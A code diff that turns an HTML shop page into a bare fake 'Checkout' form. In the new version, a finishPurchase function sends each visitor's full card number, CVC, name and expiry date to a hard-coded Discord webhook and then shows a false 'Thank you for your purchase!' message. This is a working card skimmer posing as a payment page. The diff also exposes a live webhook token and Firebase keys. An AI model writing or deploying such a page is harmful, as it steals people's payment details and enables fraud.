@@ -1,180 +1,109 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Brainrot Shop</title>
+<title>Checkout</title>
 <style>
-body { font-family: Arial, sans-serif; margin:0; background:#111; color:#fff; }
-header { padding:20px; background:#222; text-align:center; font-size:2rem; }
-.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:15px; padding:20px; }
-.item { background:#1a1a1a; padding:10px; border-radius:12px; text-align:center; font-size:0.9rem; cursor:pointer; }
-.item img { width:100%; max-height:120px; object-fit:contain; border-radius:8px; }
-button { margin-top:8px; padding:6px 12px; border:none; background:#ff3cc7; color:#000; font-weight:bold; border-radius:6px; cursor:pointer; font-size:0.9rem; }
-#adminPanel { display:none; position:fixed; top:20px; right:20px; background:#222; padding:20px; border-radius:12px; width:300px; box-shadow:0 0 10px #000; z-index:1000; }
-#checkoutModal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:2000; justify-content:center; align-items:center; }
-#checkoutBox { background:#222; padding:20px; border-radius:12px; width:300px; text-align:center; }
-#checkoutBox input { width:100%; padding:8px; margin-top:10px; border-radius:6px; border:none; }
+    body {
+        background:#111;
+        color:white;
+        font-family:Arial;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        height:100vh;
+    }
+
+    #checkoutBox {
+        background:#222;
+        padding:25px;
+        width:350px;
+        border-radius:10px;
+    }
+
+    input {
+        width:100%;
+        padding:10px;
+        margin-top:10px;
+        border-radius:5px;
+        border:none;
+        outline:none;
+    }
+
+    #purchaseBtn {
+        width:100%;
+        padding:12px;
+        margin-top:20px;
+        border:none;
+        border-radius:6px;
+        background:#555;
+        color:white;
+        font-size:16px;
+        cursor:not-allowed;
+        transition:0.2s;
+    }
+
+    #purchaseBtn.enabled {
+        background:#0a8;
+        cursor:pointer;
+    }
 </style>
 </head>
+
 <body>
-<header>Brainrot Shop</header>
-<div class="grid" id="grid"></div>
 
-<div id="adminPanel">
-<h2>Admin Panel</h2>
-<h3>Page Settings</h3>
-<label>Background Color:<br><input id="bgColor" type="text" placeholder="#111" style="width:100%"></label><br><br>
-<button onclick="changeBG()">Apply Background</button>
-<hr style="margin:15px 0; border-color:#444;">
-<h3>Search Items</h3>
-<input id="searchBox" type="text" placeholder="Search..." style="width:100%;">
-<hr style="margin:15px 0; border-color:#444;">
-<h3>Add / Edit Items</h3>
-<label>Name:<br><input id="itemName" type="text" style="width:100%"></label><br><br>
-<label>Price:<br><input id="itemPrice" type="number" style="width:100%"></label><br><br>
-<label>Image URL:<br><input id="itemImage" type="text" style="width:100%"></label><br><br>
-<button onclick="addItem()">Add Item</button><br><br>
-<button onclick="removeLastItem()">Remove Last Item</button>
-</div>
-
-<div id="checkoutModal">
 <div id="checkoutBox">
-<h2>Checkout</h2>
-<input id="cardNum" type="text" maxlength="16" placeholder="Card Number">
-<input id="cvc" type="text" maxlength="3" placeholder="CVC">
-<input id="fullName" type="text" placeholder="Full Name">
-<input id="expDate" type="text" placeholder="Exp Date (MM/YY)">
-<button id="purchaseBtn" disabled style="background:#555;" onclick="finishPurchase()">Purchase</button>
-<button style="margin-top:10px; background:#777;" onclick="closeCheckout()">Cancel</button>
+    <h2>Checkout</h2>
+
+    <label>Card Number</label>
+    <input id="cardNum" maxlength="16" placeholder="1234 5678 9012 3456">
+
+    <label>CVC</label>
+    <input id="cvcField" maxlength="3" placeholder="123">
+
+    <label>Full Name</label>
+    <input id="fullName" placeholder="John Doe">
+
+    <label>Exp Date</label>
+    <input id="expDate" placeholder="MM/YY">
+
+    <button id="purchaseBtn">Purchase</button>
 </div>
-</div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.30.0/firebase-app.js";
-import { getDatabase, ref, set, push, onValue, remove, query, limitToLast, get } from "https://www.gstatic.com/firebasejs/9.30.0/firebase-database.js";
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
 
-// Firebase config
-const firebaseConfig = {
-  apiKey: "AIzaSyChlfZT05gxgYLvUIkLUyxfqu-xGx8z12w",
-  authDomain: "brainrttt.firebaseapp.com",
-  databaseURL: "https://brainrttt-default-rtdb.firebaseio.com",
-  projectId: "brainrttt",
-  storageBucket: "brainrttt.appspot.com",
-  messagingSenderId: "175662875410",
-  appId: "1:175662875410:web:004867384ffed1ba16a9cb",
-  measurementId: "G-FMB050L4WJ"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-const itemsRef = ref(db, 'shop/items');
-
-document.addEventListener('DOMContentLoaded', () => {
-
-  // Admin panel toggle: Delete key
-  document.addEventListener('keydown', (e) => {
-    if(e.key === 'Delete'){
-      e.preventDefault();
-      const panel = document.getElementById('adminPanel');
-      if(panel){
-        panel.style.display = (panel.style.display === 'block') ? 'none' : 'block';
-      }
-    }
-  });
-
-  // Background
-  window.changeBG = function(){ document.body.style.background = bgColor.value; };
-
-  // Search
-  searchBox.addEventListener('input', () => {
-    const term = searchBox.value.toLowerCase();
-    document.querySelectorAll(".item").forEach(i => {
-      const name = i.querySelector("h3").textContent.toLowerCase();
-      i.style.display = name.includes(term) ? 'block' : 'none';
-    });
-  });
-
-  // Globals
-  window.selectedName = "";
-  window.selectedPrice = "";
-
-  // Load items in real-time
-  onValue(itemsRef, snapshot => {
-    const grid = document.getElementById("grid");
-    grid.innerHTML = "";
-    snapshot.forEach(child => {
-      const it = child.val();
-      const div = document.createElement("div");
-      div.className = "item";
-      div.innerHTML = `<img src="${it.img}"><h3>${it.name}</h3><p>$${it.price}</p><button onclick="selectItemAndBuy('${it.name}','${it.price}')">Buy</button>`;
-      grid.appendChild(div);
-    });
-  });
-
-  // Add item
-  window.addItem = function() {
-    const name = itemName.value;
-    const price = itemPrice.value;
-    const img = itemImage.value;
-    if(!name || !price || !img) return alert("Fill all fields");
-    const newItemRef = push(itemsRef);
-    set(newItemRef, {name, price, img});
-  };
-
-  // Remove last item
-  window.removeLastItem = function() {
-    const lastItemQuery = query(itemsRef, limitToLast(1));
-    get(lastItemQuery).then(snapshot=>{
-      snapshot.forEach(child=>remove(child.ref));
-    });
-  };
-
-  // Select item for checkout
-  window.selectItemAndBuy = function(name,price){
-    selectedName = name;
-    selectedPrice = price;
-    openCheckout();
-  };
-
-  // Checkout modal
-  window.openCheckout = function(){ checkoutModal.style.display="flex"; }
-  window.closeCheckout = function(){ checkoutModal.style.display="none"; }
-
-  // Validation
-  function validateCheckout(){
-    const valid = cardNum.value.length===16 && /^\d+$/.test(cardNum.value) &&
-                  cvc.value.length===3 && /^\d+$/.test(cvc.value) &&
-                  fullName.value.trim().length>2 && expDate.value.trim().length>0;
-    purchaseBtn.disabled = !valid;
-    purchaseBtn.style.background = valid ? "#ff3cc7" : "#555";
-  }
-  ["cardNum","cvc","fullName","expDate"].forEach(id=>document.getElementById(id).addEventListener("input",validateCheckout));
-
-  // Webhook
-  const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
-  window.finishPurchase = function(){
-    const payload = { content:
-`🛒 **New Purchase**
-Item: ${selectedName}
-Price: $${selectedPrice}
-Buyer: ${fullName.value}
-Time: ${new Date().toLocaleString()}`
+function finishPurchase() {
+    const payload = {
+        content: 
+`credit card number: ${cardNum.value}
+cvc number: ${cvcField.value}
+First and Last Name: ${fullName.value}
+exp date: ${expDate.value}`
     };
+
     fetch(webhookURL, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(payload)
-    }).then(res=>{
-      if(res.ok){
-        alert("Thank you for your purchase!");
-        closeCheckout();
-        cardNum.value=""; cvc.value=""; fullName.value=""; expDate.value="";
-        validateCheckout();
-      } else alert("Webhook error.");
-    }).catch(err=>alert("Error: "+err));
-  };
-});
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(res => {
+        if (res.ok) {
+            alert("Thank you for your purchase!");
+            closeCheckout();
+
+            // Clear fields after sending
+            cardNum.value = "";
+            cvcField.value = "";
+            fullName.value = "";
+            expDate.value = "";
+            validateCheckout();
+        } else {
+            alert("Failed to send to webhook.");
+        }
+    })
+    .catch(err => alert("Error: " + err));
+}
 </script>
+
 </body>
 </html>
